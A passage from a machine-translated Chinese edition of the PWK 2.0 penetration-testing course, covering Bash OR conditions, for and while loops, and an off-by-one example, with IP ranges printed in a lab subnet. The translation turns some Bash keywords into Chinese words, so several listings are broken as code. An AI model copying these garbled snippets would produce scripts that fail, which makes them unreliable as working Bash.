<div style="position:absolute;top:135640;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:136717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:136717;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:136717;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">115</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:135752;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "一个条件为真，打印这一行"</font></font></nobr></div>
<div style="position:absolute;top:135769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别的</font></font></nobr></div>
<div style="position:absolute;top:135786;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声“你倒霉了！”</font></font></nobr></div>
<div style="position:absolute;top:135804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:135837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./or.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:135871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./or.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:135888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个条件为真，打印这一行</font></font></nobr></div>
<div style="position:absolute;top:135922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $USER &amp;&amp; echo $HOSTNAME</font></font></font></b></nobr></div>
<div style="position:absolute;top:135939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:135956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:135975;left:228"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 156 - 使用 or (||) 布尔运算符在 Bash 中测试多个条件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们使用 OR (||) 来测试多个条件，因为其中一个变量</font></font></nobr></div>
<div style="position:absolute;top:136024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比较为真，整个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行成功，因此</font><font style="vertical-align: inherit;">执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">then</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分支。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:136062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.5 循环</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在计算机编程中，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">119</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助我们完成重复性任务，这些任务需要运行到某个特定时间</font></font></nobr></div>
<div style="position:absolute;top:136122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">符合标准。</font><font style="vertical-align: inherit;">迭代对渗透测试人员特别有用，因此我们建议您支付非常高的费用</font></font></nobr></div>
<div style="position:absolute;top:136142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密切关注这一部分。</font></font></nobr></div>
<div style="position:absolute;top:136175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在bash，两个最主要的循环命令是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">120</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同时</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">121</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们来看看</font></font></nobr></div>
<div style="position:absolute;top:136194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两个都。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:136229;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.5.1 For 循环</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136266;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环非常实用并且在 Bash 单行程序中工作得很好。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">122</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种类型的循环用于</font></font></nobr></div>
<div style="position:absolute;top:136286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对列表中的每个项目执行一组给定的命令。</font><font style="vertical-align: inherit;">让我们简单地看一下它的一般</font></font></nobr></div>
<div style="position:absolute;top:136305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">句法：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 &lt;list&gt; 中的 var-name</font></font></nobr></div>
<div style="position:absolute;top:136357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做</font></font></nobr></div>
<div style="position:absolute;top:136374;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;要执行的操作&gt;</font></font></nobr></div>
<div style="position:absolute;top:136391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕</font></font></nobr></div>
<div style="position:absolute;top:136410;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 157 - for 循环的一般语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环将采取的每个项目在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列表</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（按顺序），分配该项目作为变量的值</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VAR-</font></font></i></nobr></div>
<div style="position:absolute;top:136459;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">done</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之间执行给定的动作</font><font style="vertical-align: inherit;">，然后回到顶部，抓住下一个</font></font></nobr></div>
<div style="position:absolute;top:136478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列表中的项目，并重复这些步骤，直到列表用完。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:136607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">119 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Whatis.com, 2005), http://whatis.techtarget.com/definition/loop</font></font></font></nobr></div>
<div style="position:absolute;top:136627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">120 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 基金会，2010 年），https://www.linux.com/learn/essentials-bash-scripting-using-loops</font></font></font></nobr></div>
<div style="position:absolute;top:136647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">121 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Bash 初学者指南，2008 年），http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_09_02.html</font></font></font></nobr></div>
<div style="position:absolute;top:136667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">122 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Bash One-Liners，2019 年），http://www.bashoneliners.com/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:136795;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="116"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 116 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:136828;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:137905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:137905;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:137905;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">116</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一个更实际的例子，它会快速打印文件中的前 10 个 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:136943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.0/24 子网：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">123</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ip in $(seq 1 10); </font><font style="vertical-align: inherit;">做回声 10.11.1.$ip; </font><font style="vertical-align: inherit;">完毕</font></font></font></b></nobr></div>
<div style="position:absolute;top:136995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.1</font></font></nobr></div>
<div style="position:absolute;top:137012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.2</font></font></nobr></div>
<div style="position:absolute;top:137029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.3</font></font></nobr></div>
<div style="position:absolute;top:137046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.4</font></font></nobr></div>
<div style="position:absolute;top:137063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5</font></font></nobr></div>
<div style="position:absolute;top:137080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.6</font></font></nobr></div>
<div style="position:absolute;top:137097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7</font></font></nobr></div>
<div style="position:absolute;top:137114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:137131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.9</font></font></nobr></div>
<div style="position:absolute;top:137148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10</font></font></nobr></div>
<div style="position:absolute;top:137167;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 158 - 在 Bash 中使用 for 循环的示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个 Bash 单行（清单 158）中，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">seq</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令打印了一个数字序列，在</font></font></nobr></div>
<div style="position:absolute;top:137216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，数字一到十。</font><font style="vertical-align: inherit;">然后将每个数字分配给</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ip</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量，然后</font></font></nobr></div>
<div style="position:absolute;top:137235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环多次运行时，</font><font style="vertical-align: inherit;">每个 IP 地址都会显示在屏幕上</font><font style="vertical-align: inherit;">，并在结束时退出</font></font></nobr></div>
<div style="position:absolute;top:137255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列。</font></font></nobr></div>
<div style="position:absolute;top:137287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重写前面的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环的</font><font style="vertical-align: inherit;">另一种方法</font><font style="vertical-align: inherit;">涉及</font><font style="vertical-align: inherit;">使用范围的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大括号扩展</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">124</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">125</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">布雷斯</font></font></nobr></div>
<div style="position:absolute;top:137306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用范围扩展被写入给出范围的第一个和最后一个值，并且可以是一个序列</font></font></nobr></div>
<div style="position:absolute;top:137326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数字或字符。</font><font style="vertical-align: inherit;">这被称为“序列表达式”：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:137361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for i in {1..10}; </font><font style="vertical-align: inherit;">做回声 10.11.1.$i;done</font></font></font></b></nobr></div>
<div style="position:absolute;top:137378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.1</font></font></nobr></div>
<div style="position:absolute;top:137395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.2</font></font></nobr></div>
<div style="position:absolute;top:137412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.3</font></font></nobr></div>
<div style="position:absolute;top:137429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.4</font></font></nobr></div>
<div style="position:absolute;top:137446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5</font></font></nobr></div>
<div style="position:absolute;top:137463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.6</font></font></nobr></div>
<div style="position:absolute;top:137480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7</font></font></nobr></div>
<div style="position:absolute;top:137497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:137514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.9</font></font></nobr></div>
<div style="position:absolute;top:137530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10</font></font></nobr></div>
<div style="position:absolute;top:137550;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 159 - 在 Bash 中使用范围进行大括号扩展</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种类型的循环有很大的潜力。</font><font style="vertical-align: inherit;">向屏幕显示 IP 地址可能看起来不像</font></font></nobr></div>
<div style="position:absolute;top:137599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常有用，但我们可以使用相同的循环来运行</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">nmap</font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"> 127</font></font><font style="vertical-align: inherit;">的端口扫描</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">126</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（我们在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:137618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在另一个模块中详细说明）。</font><font style="vertical-align: inherit;">我们也可以尝试使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来查看是否有任何 IP</font></font></nobr></div>
<div style="position:absolute;top:137638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址响应 ICMP 回显请求，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">128</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:137755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">123 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（思科，2016 年），https://www.cisco.com/c/en/us/support/docs/ip/routing-information-protocol-rip/13788-3.html</font></font></font></nobr></div>
<div style="position:absolute;top:137775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">124 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNU，2019），https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html</font></font></font></nobr></div>
<div style="position:absolute;top:137795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">125 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Bash Hackers Wiki，2014 年），http://wiki.bash-hackers.org/syntax/expansion/brace</font></font></font></nobr></div>
<div style="position:absolute;top:137815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">126 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Port_scanner</font></font></font></nobr></div>
<div style="position:absolute;top:137835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），http://nmap.org/</font></font></font></nobr></div>
<div style="position:absolute;top:137855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">128 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Firewall.cx，2018），http://www.firewall.cx/networking-topics/protocols/icmp-protocol/152-icmp-echo-ping.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:137983;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="117"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 117 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:138016;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:139093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:139093;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:139093;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">117</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:138112;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.5.2 While 循环</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138150;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">While</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环也很常见，并且在表达式为真时执行代码。</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环有</font></font></nobr></div>
<div style="position:absolute;top:138169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个简单的格式，就像</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一样</font><font style="vertical-align: inherit;">，使用方括号 ([]) 进行测试：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而 [ &lt;一些测试&gt; ]</font></font></nobr></div>
<div style="position:absolute;top:138221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做</font></font></nobr></div>
<div style="position:absolute;top:138238;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;执行一个动作&gt;</font></font></nobr></div>
<div style="position:absolute;top:138255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕</font></font></nobr></div>
<div style="position:absolute;top:138274;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 160 - while 循环的一般语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">while</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环</font><font style="vertical-align: inherit;">重新创建前面的示例</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./while.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:138356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:138373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#while循环示例</font></font></nobr></div>
<div style="position:absolute;top:138406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计数器=1</font></font></nobr></div>
<div style="position:absolute;top:138441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而 [ $counter -lt 10 ]</font></font></nobr></div>
<div style="position:absolute;top:138457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做</font></font></nobr></div>
<div style="position:absolute;top:138474;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "10.11.1.$counter"</font></font></nobr></div>
<div style="position:absolute;top:138491;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（（计数器++））</font></font></nobr></div>
<div style="position:absolute;top:138508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕</font></font></nobr></div>
<div style="position:absolute;top:138542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./while.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:138576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./while.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:138593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.1</font></font></nobr></div>
<div style="position:absolute;top:138610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.2</font></font></nobr></div>
<div style="position:absolute;top:138627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.3</font></font></nobr></div>
<div style="position:absolute;top:138644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.4</font></font></nobr></div>
<div style="position:absolute;top:138661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5</font></font></nobr></div>
<div style="position:absolute;top:138678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.6</font></font></nobr></div>
<div style="position:absolute;top:138695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7</font></font></nobr></div>
<div style="position:absolute;top:138712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:138729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.9</font></font></nobr></div>
<div style="position:absolute;top:138748;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 161 - 在 Bash 中使用 while 循环</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这不是我们预期的输出。</font><font style="vertical-align: inherit;">这是一个常见的错误，称为“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">逐一</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">” </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">129</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误。</font><font style="vertical-align: inherit;">在里面</font></font></nobr></div>
